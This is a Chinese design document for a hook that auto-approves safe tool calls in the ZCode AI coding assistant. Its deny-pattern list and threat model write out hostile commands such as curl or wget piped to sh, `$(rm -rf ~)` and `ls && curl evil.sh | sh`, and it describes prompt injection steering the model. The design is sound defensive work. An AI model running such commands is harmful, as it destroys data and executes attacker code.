# zcode-auto-approve 设计方案

- 版本：v0.1（M1 设计稿）
- 日期：2026-09-15
- 状态：**待用户复核**（设计访谈未获答复，按推荐方案成稿，见各 ADR）
- 术语以 [glossary.md](glossary.md) 为准

---

## 1. 背景与目标

### 1.1 问题

ZCode 在执行有副作用的工具调用（`Bash`、`Write`、`Edit` 等）前会弹出权限审批窗。日常开发中大量指令是明显安全的（`ls`、`git status`、`npm test`……），逐条人工确认的体验成本很高。

### 1.2 目标

提供一个**用户级（全局）** 的 `PermissionRequest` hook：

1. 对**静态可判定为安全**的指令自动放行，消除弹窗；
2. 对不确定或危险的指令**退回原生人工审批**，安全底线不降级；
3. 规则外置、可编辑，放行行为全程留审计日志；
4. 单文件脚本 + 零第三方依赖，安装/卸载各一条命令。

### 1.3 非目标（v1 明确不做）

- 不主动 deny 任何命令（见 [ADR-0005](adr/0005-passthrough-no-deny.md)）；
- 不修改工具入参（`updatedInput`）、不注入持久权限规则（`permissionUpdates`，M4 再评估）；
- 不做语义级/LLM 级的命令理解，只做静态结构分析；
- 不支持 workspace 级规则覆盖（仅支持 workspace 禁用列表）。

---

## 2. 事实基础（已从本机源码验证）

以下协议事实全部来自对本机文件的直接考察，而非文档转述：

- **来源 1**：ZCode 核心 hook 运行时（打包于 `~/.zcode/cli/plugins/cache/zcode-plugins-official/browser-use/0.4.2/dist/mcp/server.js`）：
  - `createClaudeCompatibleHookStdin`（约 L110870）：stdin payload 的构造逻辑；
  - `runPermissionRequestHooks`（约 L79492）：`PermissionRequest` 的输入构造与决策映射；
  - `processHookExecutionResult` / `parseHookStdout`（约 L111563）：stdout/exit code 语义；
  - `HookJSONOutputSchema` / `PermissionRequestHookDecisionSchema`（约 L69942）：输出 schema。
- **来源 2**：官方诊断文档 `zcode-guide` 插件的 `diagnosing-hooks` / `zcode-configuration-guide` skill。
- **来源 3**：本机环境：Windows 10 (win32 10.0.26200)、Git Bash、Node v22.22.2（fnm 管理）、Python 3.14.6、git 2.53.0。
- **现状**：`~/.zcode/cli/config.json` 尚不存在（provider 配置在 `~/.zcode/v2/config.json`，无 `hooks` 键）；已装插件中无人注册 `PermissionRequest` hook，本项目无冲突。

关键结论（设计以此为准）：

1. `PermissionRequest` 是受支持的七个 hook 事件之一，matcher 为**区分大小写的工具名正则**，省略即匹配全部工具。
2. 配置文件型 hook 必须设 `hooks.enabled: true` 才运行（本机当前无其他配置型 hook，开启无副作用）。
3. hook 通过 **stdin 收 JSON、stdout 回 JSON、exit code 表语义**，三通道的精确协议见 §4。
4. `type: "process"` hook 以 argv 方式直接启动可执行文件，不经 shell——Windows 上规避 shell 兼容性问题的正道。

---

## 3. 总体架构

```
┌─────────────┐  触发    ┌──────────────────────────────────────────┐
│ ZCode 会话   │ ───────► │ PermissionRequest 事件                    │
│ (工具调用待审)│          │ (省略 matcher ⇒ 匹配所有工具)              │
└─────────────┘          └───────────────┬──────────────────────────┘
                                         │ stdin: JSON payload (§4.1)
                                         ▼
                         ┌───────────────────────────────┐
                         │ src/approve.mjs  (Node 单文件) │
                         │                               │
                         │ 0. 载入 rules.json (带缓存校验) │
                         │ 1. 护栏: workspace 禁用?        │
                         │ 2. 黑名单优先 (denylist)        │
                         │ 3. 护栏: riskLevel 上限         │
                         │ 4. 工具白名单 (§5.3)            │
                         │ 5. Bash: 复合命令逐段判定 (§6)   │
                         │ 6. 全部 try/catch, 异常=直通     │
                         └───────────────┬───────────────┘
                          放行            │           不放行/不确定
                          ▼               │              ▼
        stdout: {"decision":"approve"}    │      stdout: 空, exit 0
        exit 0                            │      (pass-through)
                          ▲               │              ▼
                          │               │      ┌──────────────┐
        ┌─────────────────┘               └─────►│ 原生人工审批窗 │
        ▼                                        └──────────────┘
┌──────────────────┐   ┌────────────────────────────────┐
│ 自动通过, 无弹窗    │   │ 审计日志 (每次判定一行 JSONL)     │
└──────────────────┘   │ ~/.zcode/zcode-auto-approve/    │
                       │ audit/audit-YYYY-MM-DD.jsonl    │
                       └────────────────────────────────┘
```

组件清单：

| 组件 | 位置 | 职责 |
|---|---|---|
| hook 脚本 | `src/approve.mjs` | 读取 stdin → 规则判定 → 输出决策 → 写审计 |
| 规则文件 | 仓库内 `rules.json`（可用环境变量 `ZCODE_AUTO_APPROVE_RULES` 覆盖路径） | 白名单/黑名单/护栏/profile |
| 审计日志 | `~/.zcode/zcode-auto-approve/audit/audit-YYYY-MM-DD.jsonl`（`ZCODE_AUTO_APPROVE_LOG_DIR` 可覆盖） | 判定留痕 |
| 安装器 | `scripts/install.mjs` | 解析 node 绝对路径 → 备份并改写 `~/.zcode/cli/config.json` |
| 卸载器 | `scripts/uninstall.mjs` | 移除 hook 注册项，恢复 `hooks.enabled` |

---

## 4. 与 ZCode 的对接协议

### 4.1 输入（stdin）协议

ZCode 通过 stdin 传入一个 JSON 对象，同时含驼峰原字段与 snake_case 兼容别名。脚本统一读 snake_case（兼容面更广）：

```jsonc
{
  // —— 脚本真正使用的字段 ——
  "hook_event_name": "PermissionRequest",   // 必须校验，防串事件
  "tool_name": "Bash",                      // 工具名（区分大小写）
  "tool_input": { "command": "npm test" },  // 工具参数（各工具结构不同）
  "riskLevel": "low",                       // low|medium|high|critical
  "cwd": "C:\\repo",                        // 当前工作目录（护栏用）
  "session_id": "…",
  "permission_mode": "default",

  // —— 仅透传进审计日志的字段 ——
  "reason": "Tool Bash requires approval",
  "requestId": "…", "toolCallId": "…", "tool_call_id": "…",
  "timestamp": "2026-09-15T07:30:00.000Z",
  "sideEffectScope": "…", "traceId": "…", "turnId": "…", "mode": "…",
  "transcript_path": "…"
}
```

要点：

- 脚本入口首先断言 `hook_event_name === "PermissionRequest"`，不匹配直接空输出退出（防御性，正常不会发生）。
- `riskLevel` 驼峰原字段**没有** snake_case 别名，必须读 `riskLevel`。
- `tool_input` 的结构按工具区分：`Bash` → `{ command, timeout?, … }`；`Write`/`Edit` → `{ file_path, … }`。脚本按 `tool_name` 分派解析器。

### 4.2 输出（stdout / exit code）协议

| 场景 | stdout | exit code | 效果 |
|---|---|---|---|
| **放行** | `{"decision":"approve"}` | 0 | ZCode 映射为 allow，跳过弹窗 |
| **直通**（不放行，退回人工审批） | 空 | 0 | 原生审批流程照常 |
| 拦截（deny） | `{"decision":"block"}` 等 | 0 或 2 | **v1 永不使用** |
| 脚本崩溃/超时 | — | ≠0 | ZCode 记 hook 错误；本项目通过全局 try/catch + 5s 超时兜底避免 |

约束（来自 schema 验证逻辑，务必遵守）：

- stdout 仅当非空且以 `{` 开头才会被当 JSON 解析；输出**必须且只能**是单行紧凑 JSON；
- 输出 schema 是**严格白名单**，多余键直接判失败——只输出 `decision` 一个键；
- 高级形态 `hookSpecificOutput.decision.behavior: "allow"`（可携带 `permissionUpdates`/`updatedInput`）留作 M4。

### 4.3 注册形态（安装器写入 `~/.zcode/cli/config.json` 的内容）

```jsonc
{
  "hooks": {
    "enabled": true,          // 激活配置型 hook runner 的总开关
    "events": {
      "PermissionRequest": [
        {
          // 省略 matcher ⇒ 匹配所有工具，由脚本按 tool_name 自行分派
          "hooks": [
            {
              "type": "process",
              // 安装时用 process.execPath 解析出的绝对路径，规避 fnm PATH 问题
              "command": "C:\\Users\\yx292\\AppData\\Roaming\\fnm\\node-versions\\v22.22.2\\installation\\node.exe",
              "args": [
                "C:\\Users\\yx292\\ZCodeProject\\zcode-auto-approve\\src\\approve.mjs"
              ],
              "timeoutMs": 5000,
              "statusMessage": "auto-approve 规则检查中"
            }
          ]
        }
      ]
    }
  }
}
```

设计取舍：

- **省略 matcher**：规则里"覆盖哪些工具"本来就要在脚本内判定（工具白名单是规则文件的一部分），matcher 再切一层反而让生效范围分裂在两处。省略后规则文件是唯一事实来源。
- **`timeoutMs: 5000`**：脚本只做字符串匹配与一次小文件读，5s 绰绰有余；超时被 ZCode 记为 hook 失败、不影响审批流（fail-safe 方向）。
- **`hooks.enabled: true` 的影响面**：它激活的是整个配置型 hook runner。本机当前无其他配置型 hook，无副作用；若将来用户手加了别的配置 hook，会一并被激活——安装器在检测到已有其他 hook 时打印提示。

---

## 5. 规则引擎设计

### 5.1 求值顺序（固定，不可配置）

```
0. hook_event_name !== "PermissionRequest"            → 直通
1. cwd 命中 disabledWorkspaces（前缀匹配）              → 直通（记审计）
2. tool_name 命中 deny.tools                           → 直通（记审计）
3. tool_name == "Bash" 且任一段命中 deny.patterns       → 直通（记审计）
4. riskLevel > guards.maxRiskLevel                     → 直通（记审计）
5. tool_name 命中 profile.tools                        → 放行
6. tool_name == "Bash"：复合命令逐段判定（§6），全部安全   → 放行
7. tool_name ∈ {Write, Edit, ApplyPatch}：路径护栏（§5.4）→ 放行或直通
8. 其余                                                 → 直通（记审计）
```

顺序体现两条铁律：**黑名单永远优先于白名单**；**护栏永远优先于白名单**（riskLevel 是 ZCode 自己的判断，作为独立兜底而非唯一依据）。

### 5.2 rules.json schema

```jsonc
{
  "version": 1,
  "activeProfile": "moderate",

  "profiles": {
    "conservative": {
      "description": "只放行只读命令",
      "maxRiskLevel": "low",
      "bashGroups": ["readonly"],
      "tools": ["Read", "Glob", "Grep", "TodoRead", "TodoWrite", "Task"]
    },
    "moderate": {
      "description": "只读 + 常见安全开发操作（默认）",
      "maxRiskLevel": "medium",
      "bashGroups": ["readonly", "safework"],
      "tools": ["Read", "Glob", "Grep", "TodoRead", "TodoWrite", "Task"],
      "fileEdits": { "pathPolicy": "workspace-only" }
    }
  },

  // Bash 命令组：键为组名，值为「命令规格」数组。
  // 规格形如 "git status"（前缀+子命令）、"ls"（裸命令）、
  // "rg:*"（任意参数）——精确语义见 §6.3
  "bashGroups": {
    "readonly": [
      "ls", "cat", "head", "tail", "wc", "grep", "rg", "find", "fd",
      "which", "where", "file", "stat", "du", "df", "tree", "echo",
      "pwd", "whoami", "date", "env", "printenv", "type",
      "git status", "git diff", "git log", "git show", "git branch",
      "git remote", "git tag", "git stash list", "git rev-parse",
      "node --version", "npm ls", "npm run", "npx --version",
      "python --version", "pip list"
    ],
    "safework": [
      "mkdir", "touch", "cp", "mv",
      "git add", "git commit", "git checkout", "git switch", "git pull",
      "git fetch", "git stash", "git restore", "git worktree",
      "npm install", "npm ci", "npm test", "npm exec",
      "pnpm install", "pnpm test", "pnpm run", "pnpm exec",
      "yarn install", "yarn test",
      "node", "npx", "python", "pytest", "tsc", "eslint", "prettier",
      "cargo build", "cargo test", "go build", "go test", "go vet",
      "make"
    ]
  },

  "deny": {
    // 正则（不区分大小写），匹配任一段即拒绝自动放行
    "patterns": [
      "rm\\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r)",       // rm -rf 任意顺序
      "rm\\s+.*(/|~)\\s*$",                             // rm 系统根/家目录
      "\\bsudo\\b", "\\bsu\\b",
      "curl[^|]*\\|\\s*(ba|z)?sh", "wget[^|]*\\|\\s*(ba|z)?sh",
      "\\beval\\b", "\\bbase64\\s+(-d|-D|--decode)\\b",
      "reg\\s+(add|delete|import)", "Set-ExecutionPolicy",
      "schtasks|sc\\s+(config|delete)|netsh",
      "chkdsk|format\\s+[a-z]:|diskpart",
      "git\\s+push\\s+.*--force",                       // 强推不自动放行
      ">\\s*/dev/sd", "dd\\s+of=/dev/"
    ],
    // 这些工具的审批一律不代答（未知爆炸半径）
    "tools": ["mcp__.*", "WebFetch", "WebSearch", "Agent", "SendMessage"]
  },

  "guards": {
    "maxRiskLevel": "medium",        // 冗余默认值；实际取 activeProfile 的
    "disabledWorkspaces": [],         // cwd 前缀匹配，如 "D:\\projects\\obsidian-sync"
    "redirectPolicy": "workspace-only" // Bash 重定向 > >> 的目标限制，见 §6.4
  }
}
```

### 5.3 工具白名单的边界说明

- `Read`/`Grep` 等只读工具**大概率不会触发** `PermissionRequest`（ZCode 通常直接放行），写进白名单是防御性的，成本为零。
- MCP 工具（`mcp__…`）默认在 `deny.tools` 里：跨工具的副作用半径无法静态评估。用户确信某个 MCP 工具安全时，从 `deny.tools` 移除并加入 `profile.tools` 即可——**注意 deny 优先，必须先移出黑名单**。
- `WebFetch`/`WebSearch` 虽是"读"，但 URL 本身可携带外泄数据，v1 不放行。

### 5.4 文件写操作的路径护栏

`Write` / `Edit` / `ApplyPatch`（`Write`/`Edit` 的别名）仅在 moderate 档放行，且：

- `tool_input.file_path`（或各工具对应字段）解析为绝对路径后必须位于 **stdin 的 `cwd` 之下**（`path.resolve(cwd, file_path)` 前缀检查，含大小写归一）；
- 写到 workspace 之外（系统目录、其他盘、家目录敏感文件）→ 直通；
- conservative 档完全不放行文件写。

---

## 6. Bash 复合命令解析（安全核心）

### 6.1 分段算法

1. 取 `tool_input.command`（缺失 → 直通）；
2. 先整体扫一遍**不可静态分析结构**（§6.2），命中任何一个 → 直通；
3. 按 `&&`、`||`、`;`、`|`、`\n` 切分为段（尊重引号内的分隔符：先用一个引号感知的微型分词器 tokenize，再按顶层操作符切分，**不调用任何 shell**）；
4. 每段做 `deny.patterns` 检查（任一命中 → 直通）与白名单匹配（§6.3）；
5. **全部段安全 → 放行；任何一段不安全 → 整条直通**。

### 6.2 不可静态分析结构（出现即直通）

- 命令替换：`$(...)`、`` `...` ``；
- `eval`、`source`/`.`、`exec`；
- 进程替换 `<(...)`、`>(...)`；
- heredoc（`<<`）：v1 一律视为不可分析；
- 管道到解释器：`| sh`、`| bash`、`| python`、`| node`（已被 deny.patterns 的子集覆盖，此处显式列出）；
- 编码混淆：`base64 -d`、`xxd -r`、`openssl enc -d` 后接管道。

### 6.3 白名单匹配语义

命令规格（bashGroups 的元素）按以下语义解释，**保守取向**：

| 规格 | 匹配语义 |
|---|---|
| `"ls"` | 命令字为 `ls`，任意参数，但参数含重定向/替换已在前面被拦截 |
| `"git status"` | 命令字 `git` + 第一个子命令 `status`，其余参数任意 |
| `"rg:*"` | 命令字 `rg`（显式通配写法，与 `"rg"` 等价，预留语义扩展） |

- 段的命令字取 token 化后的第 0 个 token；比较先精确匹配，再尝试去掉引号后匹配；
- **环境变量前缀**（如 `FOO=bar cmd`）：剥离赋值前缀后按 `cmd` 判定；
- 白名单匹配不到 → 该段不安全 → 整条直通。宁可多弹窗，不可错放。

### 6.4 重定向护栏

- `> file` / `>> file`：目标解析后必须位于 `cwd` 下（`redirectPolicy: "workspace-only"`），否则该段不安全；
- `2>`、`&>` 同理；`/dev/null` 永远允许；
- `<` 输入重定向：只读，不限制。

---

## 7. 安全设计与威胁模型

### 7.1 威胁模型

| # | 威胁 | 对策 |
|---|---|---|
| T1 | **提示注入**诱导模型执行危险命令（如"运行我从网页里读到的这串 curl） | hook 是模型之外的静态防线：黑名单 + 白名单 + 不可分析结构直通，模型无法说服脚本 |
| T2 | 危险命令伪装成安全形式（`$(rm -rf ~)` 藏在 `echo` 里） | §6.2 命令替换结构整体直通，不尝试求值 |
| T3 | 复合命令夹带（`ls && curl evil.sh \| sh`） | 逐段判定，一段不安全整条直通 |
| T4 | 白名单命令被滥用（`git commit` 提交机密、`npm install` 触发 postinstall 脚本） | 已知残余风险：moderate 档接受（记录于 ADR-0003）；conservative 档可完全规避；riskLevel 护栏兜底 |
| T5 | 脚本被篡改/规则文件被注入 | 规则文件与脚本同在版本库，git 可审计；hook 本身与 `~/.zcode` 配置同属本地信任边界（能改其一者本已能改其二） |
| T6 | 脚本崩溃/超时导致审批流程卡死或误放行 | 全局 try/catch：任何异常 → 空 stdout + exit 0（直通）；`timeoutMs: 5000` 超时同样不产生 approve |
| T7 | 审计日志泄露敏感信息（命令里带 token） | 日志仅记录命令原文与判定结果，位于用户家目录（0600 尽力而为）；文档提醒勿把密钥写进命令行 |

### 7.2 失败语义总表（全部 fail-safe 到人工审批）

| 故障 | 行为 |
|---|---|
| stdin 非法 JSON | 直通 |
| `hook_event_name` 不符 | 直通 |
| rules.json 缺失/非法/版本不认识 | 直通（**不是放行**） |
| 未知工具 / 未知 `tool_input` 结构 | 直通 |
| 任何未捕获异常 | 直通（catch-all 兜底） |
| hook 超时（>5s） | ZCode 侧记失败，不产生 approve，原生审批继续 |

**不变式：approve 只在"所有检查显式通过"时输出；一切未知路径都收敛到直通。**

---

## 8. 审计日志

- 路径：`~/.zcode/zcode-auto-approve/audit/audit-YYYY-MM-DD.jsonl`（`ZCODE_AUTO_APPROVE_LOG_DIR` 覆盖；目录自动创建）；
- 追加写、单行紧凑 JSON、UTF-8；
- **每次 hook 调用一行**（放行与直通都记，直通才可回答"为什么这条没自动过"）；
- 保留策略：v1 不自动清理，用户自行轮转（`audit` 已在 `.gitignore`）。

条目 schema：

```jsonc
{
  "ts": "2026-09-15T07:30:00.123Z",   // ISO-8601，hook 本地时间
  "decision": "approve",               // approve | passthrough
  "tool": "Bash",
  "riskLevel": "low",
  "command": "npm test",               // Bash 专用；其他工具记关键参数摘要
  "target": null,                      // Write/Edit 专用：目标路径
  "matchedRule": "bashGroups.safework:npm test",  // 命中的规则；直通时记原因码
  "reasonCode": null,                  // 直通原因：deny-pattern|risk-level|
                                       // no-match|unanalyzable|workspace-disabled|
                                       // path-outside-workspace|redirect-outside|error
  "cwd": "C:\\repo",
  "sessionId": "…"
}
```

---

## 9. 安装与卸载

### 9.1 安装器（`scripts/install.mjs`）

1. `process.execPath` 解析当前 node 绝对路径（规避 fnm 的 PATH 在 GUI 子进程里缺失的问题）；
2. 读 `~/.zcode/cli/config.json`（不存在则创建空对象）；
3. 备份到 `config.json.bak-<yyyyMMdd-HHmmss>`；
4. 深合并写入 §4.3 的 `hooks` 结构（若已有本项目 hook 则原位更新，不重复注册）；
5. 检测到用户已有其他配置型 hook 时，打印"`hooks.enabled: true` 将同时激活它们"的提示；
6. 输出安装摘要与回滚命令。

### 9.2 卸载器（`scripts/uninstall.mjs`）

1. 移除本项目的 hook 注册项；
2. 若 `hooks.events` 因此为空：删除 `events` 键；若用户无其他配置型 hook，同时把 `enabled` 还原为删除前的值（安装时记录于注册项旁的自描述注释性字段不可行——JSON 无注释——故卸载时按"events 为空即还原为 false"处理，并打印说明）。

### 9.3 升级

改完 `src/approve.mjs` 或 `rules.json` 即生效（每次 hook 调用都是新进程，无缓存）；仅当改了注册结构才需要重跑 install。

---

## 10. 测试方案

### 10.1 单元测试（`node --test`，M2）

- 分词器：引号/转义/顶层操作符切分的黄金用例集；
- 白名单匹配语义：`§6.3` 每行语义一个用例；
- deny.patterns：每条正则至少一个正例一个反例；
- 求值顺序：黑名单优先于白名单、护栏优先于白名单的对抗用例；
- 失败语义：`§7.2` 每行一个注入故障的用例（坏 rules.json、坏 stdin…）；
- 黄金集：≥60 条真实命令样本（含 T1–T3 的攻击样本）过 整链 `stdin → decision`。

### 10.2 真机验收（M3）

| 步骤 | 预期 |
|---|---|
| install 后重启 ZCode，让模型跑 `ls` / `git status` | 无弹窗，审计日志出现 approve 行 |
| 让模型跑 `rm -rf /tmp/x`（黑名单）| 弹窗照常，日志 reasonCode=deny-pattern |
| 让模型跑含 `$(...)` 的命令 | 弹窗照常，reasonCode=unanalyzable |
| `Write` 到 workspace 内 / 外 | 内：无弹窗；外：弹窗，reasonCode=path-outside-workspace |
| 临时把 rules.json 改坏 | 一切照常弹窗，reasonCode=error |
| 卸载后 | hook 不再触发，`hooks.enabled` 还原 |

---

## 11. 已知限制

1. `riskLevel` 的判定口径是 ZCode 内部实现，版本间可能变化——护栏是"上限"语义（高于上限不放行），口径变严只会少放行，方向安全；
2. Windows 路径大小写归一按当前盘符大小写处理，极端符号链接场景可能漏判（直通方向，不构成放行风险）；
3. `npm install` 等包管理命令的理论供应链风险（T4）是 moderate 档的**已接受残余风险**；
4. Git Bash 语法（`<(...)` 等）覆盖以 §6.2 黑结构为准，未穷尽所有 shell 方言。

---

## 12. 里程碑

| 里程碑 | 内容 | 状态 |
|---|---|---|
| M1 | 项目初始化、README、本设计文档、ADR×6、术语表 | ✅ 本次交付 |
| M2 | `src/approve.mjs` + `rules.json` + 单元测试全绿 | 待做 |
| M3 | `scripts/install.mjs` / `uninstall.mjs` + §10.2 真机验收 | 待做 |
| M4 | `permissionUpdates` 持久规则注入、workspace 级规则覆盖、可选 deny 模式、规则热校验 CLI | 远期 |
